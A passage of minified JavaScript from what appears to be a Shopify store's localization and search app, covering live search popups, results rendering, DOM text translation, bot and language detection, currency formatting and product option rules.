                        var g = document.querySelectorAll("input[name=q]");
                        g.length && [].forEach.call(g, function(b) {
                            b.setAttribute("autocomplete", "OfF"),
                                b.setAttribute("autocorrect", "off"),
                                b.setAttribute("autocapitalize", "off");
                            var g = b.closest("form");
                            g && (g.action = "/pages/" + f.settings.searchPageHandle),
                            g && "LS_search" === g.id || b.addEventListener("input", function() {
                                var b = this.value;
                                if (f.popup.input !== this && (f.popup.window.classList.remove("active"),
                                    f.popup.input = this),
                                    !b)
                                    return void f.popup.window.classList.remove("active");
                                f.popup.window.classList.contains("active") || (f.popup.setPosition(f.popup.input),
                                    f.popup.window.classList.add("active")),
                                    f.popup.term = b,
                                    f.searching = f.getSearching(f.popup.term),
                                    f.popup.summary = 0,
                                    f.popup.results.style.display = "none",
                                    f.popup.products.style.display = "none",
                                    f.popup.products.innerHTML = "",
                                    f.popup.collections.style.display = "none",
                                    f.popup.collections.innerHTML = "",
                                    f.popup.articles.style.display = "none",
                                    f.popup.articles.innerHTML = "",
                                    f.popup.window.classList.add("ls_searching_progress"),
                                    Object.keys(f.searching).length ? (f.queue.length && f.queue.forEach(function(a) {
                                        a instanceof XMLHttpRequest && a.abort()
                                    }),
                                        clearTimeout(e),
                                        e = setTimeout(function() {
                                            for (var b in f.searching)
                                                f.searching.hasOwnProperty(b) && f.queue.push(f.ajax_search(b, f.searching[b].url, a, c))
                                        }, 300)) : d()
                            })
                        })
                    })
                },
                ajax_search: function(a, b, c, d) {
                    var e, f = LS.search;
                    e = "products" === a ? b + "&page=" + f.searching[a].pages : b;
                    var g = new XMLHttpRequest;
                    if (g.open("GET", e, !0),
                        g.onload = function() {
                            if (4 === g.readyState)
                                if (200 === g.status) {
                                    var e;
                                    try {
                                        var h = JSON.parse(g.responseText);
                                        "enabled" === h.status && (e = h.items)
                                    } catch (i) {
                                        e = []
                                    }
                                    "function" == typeof c && c(e, a),
                                        "articles" === a && f.searching[a].blogs.length ? f.queue.push(f.ajax_search(a, b, c, d)) : "products" === a && f.searching[a].pages > 1 ? (f.searching[a].pages--,
                                            f.queue.push(f.ajax_search(a, b, c, d))) : f.searching[a].status = !0,
                                    Object.keys(f.searching).map(function(a) {
                                        return f.searching[a].status
                                    }).indexOf(!1) < 0 && "function" == typeof d && (f.queue = [],
                                        d())
                                } else
                                    "function" == typeof d && d()
                        }
                        ,
                        g.onerror = function() {
                            "function" == typeof d && d()
                        }
                        ,
                    "articles" === a && f.searching[a].blogs.length) {
                        var h = new XMLHttpRequest;
                        h.onreadystatechange = function() {
                            4 === h.readyState && 200 === h.status && (f.searching[a].blogs.splice(0, 1),
                                g.send(null))
                        }
                            ,
                            h.open("POST", "/cart/update.js", !0),
                            h.setRequestHeader("Content-Type", "application/json;charset=UTF-8"),
                            h.send(JSON.stringify({
                                attributes: {
                                    LS_searching_blog_state: f.searching[a].blogs[0]
                                }
                            })),
                            h.onerror = function() {
                                "function" == typeof d && d()
                            }
                    } else
                        g.send(null);
                    return g
                },
                getSearching: function(a) {
                    var b = LS.search
                        , c = {}
                        , d = b.settings.searchCollections
                        , e = b.settings.searchProducts
                        , f = b.settings.searchArticles
                        , g = b.settings.actualBlogsHandles
                        , h = g ? g.split(",") : [];
                    return "1" === f && h.length && (c.articles = {
                        url: "/search?view=ls_articles&q=" + encodeURIComponent(a),
                        blogs: h,
                        status: !1
                    }),
                    "1" === d && (c.collections = {
                        url: "/search?view=ls_collections&q=" + encodeURIComponent(a),
                        status: !1
                    }),
                    "1" === e && b.total_products > 0 && (c.products = {
                        url: "/search?view=ls_products&q=" + encodeURIComponent(a),
                        pages: Math.ceil(b.total_products / 1e3),
                        status: !1
                    }),
                        c
                },
                popup: {
                    window: null,
                    input: null,
                    results: null,
                    products: null,
                    collections: null,
                    articles: null,
                    term: "",
                    summary: 0,
                    init: function() {
                        var a = LS.search
                            , b = document.createElement("div");
                        b.id = "LS_search_popup";
                        var c = document.createElement("div");
                        c.classList.add("ls_search_popup_wrapper");
                        var d = document.createElement("div");
                        d.id = "LS_search_popup_summary";
                        var e = document.createElement("div");
                        e.id = "LS_search_popup_products";
                        var f = document.createElement("div");
                        f.id = "LS_search_popup_collections";
                        var g = document.createElement("div");
                        g.id = "LS_search_popup_collections",
                            c.appendChild(d),
                            c.appendChild(e),
                            c.appendChild(f),
                            c.appendChild(g),
                            b.appendChild(c),
                            document.body.appendChild(b),
                            a.popup.window = b,
                            a.popup.results = d,
                            a.popup.products = e,
                            a.popup.collections = f,
                            a.popup.articles = g,
                            window.addEventListener("scroll", function() {
                                a.popup.window.classList.contains("active") && a.popup.input && a.popup.setPosition(a.popup.input)
                            }),
                            window.addEventListener("resize", function() {
                                a.popup.window.classList.contains("active") && a.popup.input && a.popup.setPosition(a.popup.input)
                            }),
                            window.addEventListener("click", function(b) {
                                a.popup.window.classList.contains("active") && a.popup.input && (a.popup.input.contains(b.target) || a.popup.window.contains(b.target) || a.popup.window.classList.remove("active"))
                            })
                    },
                    setPosition: function(a) {
                        var b, c = LS.search, d = 5, e = 450, f = 250, g = a.getBoundingClientRect(), h = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth;
                        if (!a.offsetWidth)
                            return void c.popup.window.classList.remove("active");
                        b = e + g.left < h ? "from-left" : g.left + a.offsetWidth - e >= 0 ? "from-right" : "center";
                        var i, j, k, l;
                        "from-left" === b ? (j = g.left + "px",
                            l = e >= a.offsetWidth ? e + "px" : a.offsetWidth + "px") : "from-right" === b ? (j = g.left + a.offsetWidth - e + "px",
                            l = e >= a.offsetWidth ? e + "px" : a.offsetWidth + "px") : (j = "1%",
                            l = "98%"),
                            i = g.top + a.offsetHeight + d + "px",
                            k = f + "px",
                            c.popup.window.style.maxHeight = k,
                            c.popup.window.style.width = l,
                            c.popup.window.style.top = i,
                            c.popup.window.style.left = j
                    }
                },
                page: {
                    term: "",
                    summary: 0,
                    init: function() {
                        function a() {
                            h.innerHTML = f.translations.search_disabled,
                                h.style.display = "block",
                                j.classList.remove("ls_searching_progress")
                        }
                        function b() {
                            d(),
                                h.style.display = "block",
                                j.classList.remove("ls_searching_progress")
                        }
                        function c() {
                            j.classList.remove("ls_searching_progress")
                        }
                        function d() {
                            h.innerHTML = f.page.summary > 0 ? f.translations.results_found.replace(/\[\[count\]\]/g, f.page.summary).replace(/\[\[terms\]\]/g, f.page.term) : f.translations.results_not_found.replace(/\[\[terms\]\]/g, f.page.term),
                            f.page.summary > 0 && (h.style.display = "block")
                        }
                        function e(a, b) {
                            void 0 !== a && (f.page.summary += a.length,
                                d(),
                                a.forEach(function(a) {
                                    var c = document.createElement("div");
                                    if (c.classList.add("ls_grid_item"),
                                    "products" === b) {
                                        a.item.handle in LS.product == !1 && (LS.product[a.item.handle] = {
                                            original: a.item,
                                            locale: function() {
                                                return this.original
                                            }
                                        },
                                            LS.product[a.item.handle].original.title = a.title,
                                            LS.product[a.item.handle].original.description = a.description),
                                            c.classList.add("ls_grid_product");
                                        var d = "/products/" + a.item.handle
                                            , e = document.createElement("a");
                                        e.href = d;
                                        var f = document.createElement("img");
                                        f.src = a.item.featured_image ? a.item.featured_image : "https://cdn.shopify.com/s/assets/no-image-2048-5e88c1b20e087fb7bbe9a3771824e743c244f437e4f8ba93bbf7b11b53f7824c_480x480.gif";
                                        var g = document.createElement("div");
                                        g.classList.add("ls_product_image_wrapper"),
                                            g.appendChild(e),
                                            e.appendChild(f);
                                        var h = document.createElement("p");
                                        h.classList.add("ls_title");
                                        var i = document.createElement("a");
                                        i.href = d,
                                            i.innerHTML = a.title,
                                            h.appendChild(i);
                                        var k = document.createElement("p");
                                        k.classList.add("ls_product_price"),
                                            k.innerHTML = LS.localization.formatMoney(a.item.price),
                                            c.appendChild(g),
                                            c.appendChild(h),
                                            c.appendChild(k)
                                    } else {
                                        c.classList.add("ls_grid_text");
                                        var l = document.createElement("a");
                                        l.classList.add("ls_title"),
                                            l.innerHTML = a.title,
                                            "collections" === b ? l.href = "/collections/" + a.item.handle : "articles" === b && (l.href = "/blogs/" + a.blog + "/" + a.item.handle);
                                        var m;
                                        m = "excerpt"in a && a.excerpt ? a.excerpt : a.description.length > 220 ? a.description.substring(0, 220) + "..." : a.description;
                                        var n = document.createElement("p");
                                        n.innerHTML = m,
                                            c.appendChild(l),
                                            c.appendChild(n)
                                    }
                                    j.appendChild(c)
                                }))
                        }
                        var f = LS.search
                            , g = "#LS_find_result_summary"
                            , h = document.querySelector(g)
                            , i = "#LS_find_result_grid"
                            , j = document.querySelector(i);
                        if (!j || !h)
                            return !1;
                        if ("q"in LS.localization.urlParams && LS.localization.urlParams.q) {
                            if (f.page.term = decodeURIComponent(LS.localization.urlParams.q.replace(/\+/g, "%20")),
                                f.searching = f.getSearching(f.page.term),
                                j)
                                if (Object.keys(f.searching).length)
                                    for (var k in f.searching)
                                        f.searching.hasOwnProperty(k) && f.ajax_search(k, f.searching[k].url, e, b);
                                else
                                    a()
                        } else
                            c();
                        var l = "#LS_search_form"
                            , m = document.querySelector(l);
                        m && (m.querySelector("input[name=q]").value = f.page.term)
                    }
                }
            },
            this.domobserver = {
                globalReplaceData: null,
                dynamicTranslateDomLoaded: null,
                dynamicTranslateDomChanged: null,
                config: {
                    subtree: !0,
                    characterData: !0,
                    childList: !0,
                    attributes: !0
                },
                replacementsRegExTest: [],
                escapeRegExp: function(a) {
                    return a.replace(/[\-\[\]\/\(\)\*\+\?\.\\\^\$\|\:]/g, "\\$&").replace(/[{]{2}[\s]{0,}custom[\s]{0,}[}]{2}/g, "(.*?)")
                },
                pushCustomRegex: function(a, b) {
                    var c = /[{]{2}[\s]*custom[\s]*[}]{2}/;
                    return c.test(a) && (a = a.replace(c, b)),
                        a
                },
                regExpTest: function(a, b, c) {
                    var d = LS.domobserver
                        , e = c ? "" : "((?:[^\\w]|^|[\\s]))"
                        , f = c ? "" : "((?:[^\\w]|$|[\\s]))"
                        , g = c ? a : d.escapeRegExp(a);
                    return !!new RegExp(e + g + f,"gi").test(b) && new RegExp(e + g + f,"gi")
                },
                checkForTextContent: function(a) {
                    var b = LS.domobserver
                        , c = !1;
                    return !!a.trim() && (b.replacementsRegExTest.length && b.regExpTest(b.replacementsRegExTest.join("|"), a, !0) && (c = !0),
                        c)
                },
                parseNodes: function(a) {
                    var b = LS.domobserver;
                    if (a)
                        for (var c = a.childNodes, d = c.length; d--; ) {
                            var e = c[d]
                                , f = e.nodeType
                                , g = e.tagName;
                            "SCRIPT" !== g && "STYLE" !== g && (3 === f ? b.replaceNode(e, "data") : "INPUT" === g || "TEXTAREA" === g ? b.replaceElementNode(e) : (1 === f || 9 === f || 11 === f) && e.childNodes.length && e.innerHTML.trim() && b.checkForTextContent(e.outerHTML) && b.parseNodes(e))
                        }
                },
                replaceNode: function(a, b) {
                    var c = LS.domobserver
                        , d = LS.localization.currentLang;
                    "object" == typeof a && b in a && a[b].trim().length && c.globalReplace.forEach(function(e) {
                        if (d in e.translated && e.translated[d]) {
                            var f, g = e.translated[d], h = c.regExpTest(e.original.text, a[b]);
                            if (h)
                                do {
                                    if ((f = h.exec(a[b])) && f.length > 2) {
                                        for (var i = 2; i < f.length - 1; i++)
                                            g = c.pushCustomRegex(g, f[i]);
                                        a[b] = a[b].replace(f[0], f[1] + g + f[f.length - 1])
                                    }
                                } while (f)
                        }
                    })
                },
                replaceElementNode: function(a) {
                    var b = LS.domobserver;
                    if (a.type)
                        switch (a.type.toLowerCase()) {
                            case "submit":
                            case "button":
                            case "reset":
                                b.replaceNode(a, "value");
                                break;
                            case "text":
                            case "email":
                            case "number":
                            case "textarea":
                                b.replaceNode(a, "placeholder")
                        }
                },
                parseGlobalReplaceData: function(a) {
                    var b = [];
                    return a.split(":ELEMENT:").forEach(function(a) {
                        var c = a.split(":TRANSLATED:")
                            , d = c[0].split(":ORIGINAL:")
                            , e = void 0 !== d[0] ? d[0] : ""
                            , f = void 0 !== d[1] ? d[1] : ""
                            , g = void 0 !== d[2] ? d[2] : ""
                            , h = {};
                        void 0 !== c[1] && f.trim() && e.trim() && g.trim() && (c[1].split(":LANG:").forEach(function(a) {
                            var b = a.split(":TEXT:");
                            h[b[0]] = void 0 !== b[1] ? b[1] : ""
                        }),
                            b.push({
                                original: {
                                    before: e,
                                    text: f,
                                    after: g
                                },
                                translated: h
                            }))
                    }),
                        b
                },
                init: function() {
                    var a = LS.domobserver
                        , b = LS.localization.currentLang
                        , c = window.MutationObserver || window.WebKitMutationObserver;
                    return a.globalReplace = a.parseGlobalReplaceData(a.globalReplaceData),
                    !!a.globalReplace && (a.globalReplace.forEach(function(c) {
                        b in c.translated && c.translated[b] && a.replacementsRegExTest.push("(" + a.escapeRegExp(c.original.before) + "[\\s]{0,}" + a.escapeRegExp(c.original.text) + "[\\s]{0,}" + a.escapeRegExp(c.original.after) + ")")
                    }),
                    0 !== a.replacementsRegExTest.length && void document.addEventListener("DOMContentLoaded", function() {
                        if ("1" === a.dynamicTranslateDomLoaded && a.checkForTextContent(document.body.innerHTML) && a.parseNodes(document.body),
                        "1" === a.dynamicTranslateDomChanged) {
                            var b = 0
                                , d = [];
                            new c(function(c, e) {
                                    clearTimeout(b),
                                        d = d.concat(c),
                                        b = setTimeout(function() {
                                            e.disconnect(),
                                                d.forEach(function(b) {
                                                    "childList" === b.type && a.checkForTextContent(b.target.outerHTML) && a.parseNodes(b.target),
                                                    "characterData" === b.type && a.replaceNode(b.target, "data"),
                                                    "attributes" !== b.type || "INPUT" !== b.target.tagName && "TEXTAREA" !== b.target.tagName && "BUTTON" !== b.target.tagName || a.checkForTextContent(b.target.outerHTML) && a.replaceElementNode(b.target)
                                                }),
                                                d = [],
                                                e.observe(document.body, a.config)
                                        }, 0)
                                }
                            ).observe(document.body, a.config)
                        }
                    }))
                }
            },
            this.localization = {
                urlParams: "",
                buildify: !1,
                getUrlPrefix: "ls",
                currUrlPrefix: "curr",
                urlHash: location.hash ? location.hash.substr(1) : "",
                defaultCurr: null,
                currency: null,
                currencies: null,
                languages: null,
                countriesLangDepends: null,
                browserLangDepends: null,
                switchersStyleSets: null,
                navigations: null,
                localesJson: null,
                currentLang: null,
                defaultLang: null,
                switcherType: null,
                switcherStyle: null,
                currSwitcherType: null,
                detectingLanguage: null,
                urlModify: null,
                mdomains: null,
                urlModifyType: null,
                defaultCurrOnHover: null,
                languageInCart: null,
                shop_currency: null,
                default_money_format: null,
                getLanguageByCountry: function(a) {
                    var b = LS.localization;
                    if ("object" == typeof b.countriesLangDepends)
                        for (var c in b.countriesLangDepends)
                            if (b.countriesLangDepends.hasOwnProperty(c)) {
                                var d = b.languages.map(function(a) {
                                    return a.lang_id
                                }).indexOf(c);
                                if (d >= 0 && a in b.countriesLangDepends[c] && "true" === b.countriesLangDepends[c][a])
                                    return c
                            }
                    return b.defaultLang
                },
                botCheck: function() {
                    var a = "(googlebot/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis|pingdom)"
                        , b = new RegExp(a,"i")
                        , c = navigator.userAgent;
                    return b.test(c)
                },
                detectUserLanguage: function() {
                    var a = LS.localization;
                    return new Promise(function(b) {
                            if ("browser" === a.detectingLanguage && !a.languageInCart && a.browserLangDepends) {
                                a.botCheck() && b(a.currentLang);
                                var c = navigator.language || navigator.browserLanguage
                                    , d = c.split("-")
                                    , e = d[0].toLowerCase();
                                if ("object" == typeof a.browserLangDepends) {
                                    var f = LS.localization.browserLangDepends
                                        , g = Object.keys(f).filter(function(a) {
                                        return f[a].indexOf(c) > -1
                                    })[0]
                                        , h = Object.keys(f).filter(function(a) {
                                        return f[a].indexOf(e) > -1
                                    })[0];
                                    b(g ? g : h ? h : a.defaultLang)
                                } else
                                    b(a.defaultLang)
                            } else if ("geolocation" === a.detectingLanguage && !a.languageInCart && a.countriesLangDepends) {
                                a.botCheck() && b(a.currentLang);
                                var i = new XMLHttpRequest;
                                i.open("GET", "https://freegeoip.net/json/", !0),
                                    i.onload = function() {
                                        if (4 === i.readyState)
                                            if (200 === i.status) {
                                                var c = JSON.parse(i.responseText);
                                                b("object" == typeof c && "country_code"in c ? a.getLanguageByCountry(c.country_code.toLowerCase()) : a.defaultLang)
                                            } else
                                                b(a.defaultLang)
                                    }
                                    ,
                                    i.onerror = function() {
                                        b(a.defaultLang)
                                    }
                                    ,
                                    i.send(null)
                            } else
                                a.botCheck() && b(a.currentLang),
                                    b(a.defaultLang)
                        }
                    )
                },
                variable: function(a, b, c, d) {
                    var e = LS.localization;
                    if (null === e.localesJson)
                        return b;
                    var f = JSON.parse(e.localesJson);
                    if ("object" != typeof f)
                        return b;
                    if (e.currentLang in f == !1)
                        return b;
                    for (var g = f[e.currentLang], h = a.split("."), i = "", j = 0; j < h.length; j++) {
                        if (void 0 === i)
                            return b;
                        i = 0 === j ? g[h[j]] : i[h[j]]
                    }
                    return void 0 !== i && "" !== i ? e.patternReplace(i, c, d) : b
                },
                formatMoney: function(a, b) {
                    function c(a, b, c, d) {
                        if (c = c || ",",
                            d = d || ".",
                        isNaN(a) || null === a)
                            return 0;
                        a = (a / 100).toFixed(b);
                        var e = a.split(".");
                        return e[0].replace(/(\d)(?=(\d\d\d)+(?!\d))/g, "$1" + c) + (e[1] ? d + e[1] : "")
                    }
                    var d = LS.localization
                        , e = d.default_money_format
                        , f = d.shop_currency;
                    if ("string" == typeof a) {
                        var g = /<span[\s\S]*?>[\s\S]*?<\/span>/;
                        if (a.match(g))
                            return a;
                        a = a.replace(".", "")
                    }
                    var h = ""
                        , i = /[{]{2}\s*(\w+)\s*[}]{2}/
                        , j = b || e
                        , k = ""
                        , l = d.currencies;
                    if (d.currSwitcherType && "disabled" !== d.currSwitcherType && null !== l && "object" == typeof l && d.currency && !isNaN(a)) {
                        var m = l.map(function(a) {
                            return a.currId
                        }).indexOf(f)
                            , n = l.map(function(a) {
                            return a.currId
                        }).indexOf(d.currency);
                        if (m >= 0 && n >= 0) {
                            var o = parseFloat(l[m].rate)
                                , p = parseFloat(l[n].rate)
                                , q = a;
                            a = a / o * p,
                                j = l[n].money_format,
                                k += "<span class='LS_converted_currencies " + (d.defaultCurr !== d.currency && "1" === d.defaultCurrOnHover ? "LS_show_on_hover" : "") + "'";
                            for (var r in l)
                                if (l.hasOwnProperty(r)) {
                                    var s, t = q / o * l[r].rate, u = l[r].money_format;
                                    switch (u.match(i)[1]) {
                                        case "amount":
                                            s = c(t, 2);
                                            break;
                                        case "amount_no_decimals":
                                            s = c(t, 0);
                                            break;
                                        case "amount_with_comma_separator":
                                            s = c(t, 2, ".", ",");
                                            break;
                                        case "amount_no_decimals_with_comma_separator":
                                            s = c(t, 0, ".", ",");
                                            break;
                                        case "amount_with_apostrophe_separator":
                                            s = c(t, 2, "'")
                                    }
                                    var v = u.replace(i, s);
                                    d.defaultCurr === l[r].currId && (k += " data-default='" + d.escape(v) + "'"),
                                        k += " data-" + l[r].currId + "='" + d.escape(v) + "'"
                                }
                            k += ">&nbsp;</span>"
                        }
                    }
                    if (!j.match(i))
                        return j;
                    switch (j.match(i)[1]) {
                        case "amount":
                            h = c(a, 2);
                            break;
                        case "amount_no_decimals":
                            h = c(a, 0);
                            break;
                        case "amount_with_comma_separator":
                            h = c(a, 2, ".", ",");
                            break;
                        case "amount_no_decimals_with_comma_separator":
                            h = c(a, 0, ".", ",");
                            break;
                        case "amount_with_apostrophe_separator":
                            h = c(a, 2, "'")
                    }
                    return j.replace(i, h) + k
                },
                options: function(a) {
                    var b = LS.localization
                        , c = document.getElementById(a.element);
                    if ("object" != typeof a.options || void 0 === c)
                        return !1;
                    var d = a.options
                        , e = a.product;
                    if ("object" == typeof e && "error"in e == !1 && d)
                        for (var f in d)
                            if (d.hasOwnProperty(f)) {
                                var g = [];
                                if ("object" == typeof d[f].inputs && 0 !== Object.keys(d[f].inputs).length) {
                                    for (var h in d[f].inputs)
                                        if (d[f].inputs.hasOwnProperty(h) && b.currentLang in d[f].inputs[h].name && d[f].inputs[h].name[b.currentLang]) {
                                            var i = b.createOptions(d[f].inputs[h]);
                                            if ("wrapper"in d[f].inputs[h] && "none" !== d[f].inputs[h].wrapper) {
                                                var j = document.createElement(d[f].inputs[h].wrapper);
                                                "wrapper_class"in d[f].inputs[h] && j.setAttribute("class", b.escape(d[f].inputs[h].wrapper_class)),
                                                    function(a, b) {
                                                        [].forEach.call(b, function(b) {
                                                            a.appendChild(b)
                                                        })
                                                    }(j, i),
                                                    g.push(j)
                                            } else
                                                g = g.concat(i)
                                        }
                                    if ("object" == typeof d[f].rules && 0 !== Object.keys(d[f].rules).length) {
                                        var k = "match"in d[f] ? d[f].match : "or";
                                        if (!b.checkRule(e, d[f].rules, k))
                                            continue
                                    }
                                    [].forEach.call(g, function(a) {
                                        c.appendChild(a)
                                    })
                                }
                            }
                },
                checkRule: function(a, b, c) {
                    var d, e = LS.localization, f = !0;
                    for (var g in b)
                        if (b.hasOwnProperty(g))
                            switch (b[g].column) {
                                case "title":
                                    if (e.checkRelation(b[g].relation, b[g].condition.toLowerCase(), a.title.toLowerCase())) {
                                        if ("or" === c)
                                            return !0
                                    } else
                                        f = !1;
                                    break;
                                case "type":
                                    if (e.checkRelation(b[g].relation, b[g].condition.toLowerCase(), a.type.toLowerCase())) {
                                        if ("or" === c)
                                            return !0
                                    } else
                                        f = !1;
                                    break;
                                case "vendor":
                                    if (e.checkRelation(b[g].relation, b[g].condition.toLowerCase(), a.vendor.toLowerCase())) {
                                        if ("or" === c)
                                            return !0
                                    } else
                                        f = !1;
                                    break;
                                case "variant_price":
                                    if (a.variants.length)
                                        if (d = !1,
                                            a.variants.forEach(function(a) {
                                                var c = isNaN(parseFloat(b[g].condition)) ? null : 100 * parseFloat(b[g].condition);
                                                null !== c && e.checkRelation(b[g].relation, c, a.price) && (d = !0)
                                            }),
                                            d) {
                                            if ("or" === c)
                                                return !0
                                        } else
                                            f = !1;
                                    else
                                        f = !1;
                                    break;
                                case "tag":
                                    if (a.tags.length) {
                                        var h = !1;
                                        if (a.tags.forEach(function(a) {
                                            e.checkRelation(b[g].relation, b[g].condition.toLowerCase(), a.toLowerCase()) && (h = !0)
                                        }),
                                            h) {
                                            if ("or" === c)
                                                return !0
                                        } else
                                            f = !1
                                    } else
                                        f = !1;
                                    break;
                                case "variant_compare_at_price":
                                    if (a.variants.length) {
                                        d = !1;
                                        var i = isNaN(parseFloat(b[g].condition)) ? null : 100 * parseFloat(b[g].condition);
                                        if (a.variants.forEach(function(a) {
                                            null !== i && e.checkRelation(b[g].relation, i, a.compare_at_price) && (d = !0)
                                        }),
                                        "not_equals" === b[g].relation && "and" === c && a.variants.forEach(function(a) {
                                            a.compare_at_price == i && (d = !1)
                                        }),
                                            d) {
                                            if ("or" === c)
                                                return !0
                                        } else
                                            f = !1
                                    } else
                                        f = !1;
                                    break;
                                case "variant_weight":
                                    if (a.variants.length) {
                                        d = !1;
                                        var j = isNaN(parseFloat(b[g].condition)) ? null : 1e3 * parseFloat(b[g].condition);
                                        if (a.variants.forEach(function(a) {
                                            null !== j && e.checkRelation(b[g].relation, j, a.weight) && (d = !0)
                                        }),
                                        "not_equals" === b[g].relation && "and" === c && a.variants.forEach(function(a) {
                                            a.weight == j && (d = !1)
                                        }),
                                            d) {
                                            if ("or" === c)
                                                return !0
                                        } else
                                            f = !1
                                    } else
                                        f = !1;
                                    break;
                                case "variant_inventory":
                                    if (a.variants.length) {
                                        d = !1;
                                        var k = isNaN(parseInt(b[g].condition, 10)) ? null : parseInt(b[g].condition, 10);
                                        if (a.variants.forEach(function(a) {
                                            "shopify" === a.inventory_management && null !== k && e.checkRelation(b[g].relation, k, a.inventory_quantity) && (d = !0)
                                        }),
                                            d) {
                                            if ("or" === c)
                                                return !0
                                        } else
                                            f = !1
                                    } else
                                        f = !1;
                                    break;
                                case "variant_title":
                                    if (a.variants.length)
                                        if (d = !1,
                                            a.variants.forEach(function(a) {
                                                "Default Title" !== a.title && e.checkRelation(b[g].relation, b[g].condition.toLowerCase(), a.title.toLowerCase()) && (d = !0)
                                            }),
                                        "not_contains" !== b[g].relation && "not_equals" !== b[g].relation || "and" !== c || a.variants.forEach(function(a) {
                                            "Default Title" !== a.title && a.title.toLowerCase().indexOf(b[g].condition.toLowerCase()) >= 0 && (d = !1)
                                        }),
                                            d) {
                                            if ("or" === c)
                                                return !0
                                        } else
                                            f = !1;
                                    else
                                        f = !1
                            }
                    return "or" !== c && f
                },
                checkRelation: function(a, b, c) {
                    if ("" === b || "" === c || null === c)
                        return !1;
                    switch (a) {
                        case "equals":
                            return c == b;
                        case "not_equals":
                            return c != b;
                        case "greater_than":
                            return c > b;
                        case "less_than":
                            return c < b;
                        case "starts_with":
                            return 0 === c.indexOf(b);
                        case "ends_with":
                            return -1 !== c.indexOf(b, c.length - b.length);
                        case "contains":
                            return c.indexOf(b) >= 0;
                        case "not_contains":
                            return c.indexOf(b) < 0
                    }
                    return !1
                },
                createOptions: function(a) {
                    var b, c, d = LS.localization, e = [], f = "Property-" + (Math.floor(8888 * Math.random()) + 1111);
                    if (d.currentLang in a.label && a.label[d.currentLang]) {
                        var g = document.createElement("LABEL");
                        g.setAttribute("for", f),
                            g.innerHTML = a.label[d.currentLang],
                        "label_class"in a && g.setAttribute("class", d.escape(a.label_class)),
                            e.push(g)
                    }
                    switch (a.type) {
                        case "text":
                            c = document.createElement("INPUT"),
                                c.setAttribute("type", "text"),
                                c.name = "properties[" + d.escape(a.name[d.currentLang]) + "]",
                                c.id = f,
                            "input_class"in a && c.setAttribute("class", d.escape(a.input_class)),
                            "required"in a && parseInt(a.required, 10) && c.setAttribute("required", ""),
                            "default"in a && d.currentLang in a.default && (c.value = d.escape(a.default[d.currentLang])),
                            "placeholder"in a && d.currentLang in a.placeholder && (c.placeholder = d.escape(a.placeholder[d.currentLang])),
                                e.push(c);
                            break;
                        case "textarea":
                            var h = document.createElement("TEXTAREA");
                            h.name = "properties[" + d.escape(a.name[d.currentLang]) + "]",
                                h.id = f,
                            "input_class"in a && h.setAttribute("class", d.escape(a.input_class)),
                            "required"in a && parseInt(a.required, 10) && h.setAttribute("required", ""),
                            "default"in a && d.currentLang in a.default && (h.value = d.escape(a.default[d.currentLang])),
                            "placeholder"in a && d.currentLang in a.placeholder && (h.placeholder = d.escape(a.placeholder[d.currentLang])),
                                e.push(h);
                            break;
                        case "number":
                            c = document.createElement("INPUT"),
                                c.setAttribute("type", "number"),
                                c.name = "properties[" + d.escape(a.name[d.currentLang]) + "]",
                                c.id = f,
                            "input_class"in a && c.setAttribute("class", d.escape(a.input_class)),
                            "required"in a && parseInt(a.required, 10) && c.setAttribute("required", ""),
                            "default"in a && d.currentLang in a.default && (c.value = d.escape(a.default[d.currentLang])),
                            "placeholder"in a && d.currentLang in a.placeholder && (c.placeholder = d.escape(a.placeholder[d.currentLang])),
                                e.push(c);
                            break;
                        case "radio":
                            a.values.length && (b = 0,
                                a.values.forEach(function(c) {
                                    var f = d.currentLang in c ? d.currentLang : d.defaultLang in c ? d.defaultLang : null;
                                    if (f) {
                                        var g = "Property-" + (Math.floor(8888 * Math.random()) + 1111)
                                            , h = document.createElement("LABEL");
                                        h.setAttribute("for", g),
                                            h.innerHTML = "<input id='" + g + "' type='radio' value='" + d.escape(c[f]) + "' name='properties[" + d.escape(a.name[d.currentLang]) + "]' " + (0 === b ? "checked='checked'" : "") + " " + ("required"in a && parseInt(a.required, 10) && 0 === b ? "required=''" : "") + " >" + d.escape(c[f]),
                                        "input_class"in a && h.setAttribute("class", d.escape(a.input_class)),
                                            e.push(h),
                                            b++
                                    }
                                }));
                            break;
                        case "checkbox":
                            if (a.values.length) {
                                var i = document.createElement("INPUT");
